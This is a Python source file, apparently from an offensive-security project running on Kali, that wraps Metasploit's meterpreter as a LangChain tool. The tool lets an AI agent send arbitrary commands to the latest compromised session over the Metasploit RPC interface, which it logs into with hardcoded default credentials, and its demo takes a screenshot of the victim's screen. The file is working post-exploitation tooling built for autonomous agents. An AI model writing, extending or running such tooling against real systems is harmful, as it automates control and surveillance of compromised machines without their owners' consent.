import sys
import time
from typing import Type

sys.path.append("/home/kali/Agent/Agent-main-master/")

from langchain_core.tools import BaseTool
from openai import BaseModel
from pydantic import Field
from config.msfConsole import Client



class ScanningModuleInput(BaseModel):
    command: str = Field(description="执行的命令")

    # isDestroy_console: bool = Field(default=False, description="是否销毁控制台")
    # console_module_id: int = Field(default=None, description="控制台的ID")


# 3.1.加载扫描模块 "perform_vuln_scan"。Load scanning module
class meterpreter_module(BaseTool):
    name = "meterpreter_module"
    description = "发送命令给meterpreter，来执行命令"
    args_schema: Type[BaseModel] = ScanningModuleInput

    def _run(self, command):
        """使用命令来查询相关模块"""
        auth = Client("127.0.0.1", port=55553, user="msf", passwd="msf")
        result=''
        cmd = f"{command}"
        console_id = auth.create_console().get(b'id')
        sessions_list = auth.list_sessions()  # 获取会话列表
        print(f"获取会话列表{list(sessions_list.keys())}")
        #每次都选择最后一个sessions
        session_id = list(sessions_list.keys())[len(sessions_list)-1]
        if len(list(sessions_list.keys())) > 0:
            while True:
                 # 如果存在会话
                # 获取最新的session_id
                time.sleep(1)
                # 进行会话操作
                print(session_id)
                auth.write_meterpreter(session_id, cmd)
                time.sleep(2)
                result = auth.read_meterpreter(session_id)
                time.sleep(1)
                auth.stop_session(session_id)
                break
        auth.destroy_console(console_id)
        return result
if __name__ == '__main__':
    search = meterpreter_module()
    search__run = search._run(command="screenshot")
    print(search__run)
